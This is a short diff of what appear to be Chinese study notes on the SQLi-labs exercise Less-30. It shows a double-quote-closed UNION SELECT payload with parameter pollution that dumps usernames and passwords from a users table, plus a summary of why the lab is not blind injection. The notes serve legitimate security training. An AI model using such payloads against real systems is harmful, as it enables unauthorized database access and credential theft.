@@ -68,5 +68,6 @@ id="-1" union select 1,2,3--+"
 ```
 ?id=1&id=-1" union select 1,group_concat(username,0x3a,password),3 from users--+
 ```
+![](99_Attachments/图片/Less-30/file-20260615202353509.png)
 
 总结：Less-30 = Less-29 的结构 + 双引号闭合 + 无报错。不是盲注——数据正常时一样显示结果。有报错没报错只影响你调试时看不看得到错误信息，不影响注入拿数据。
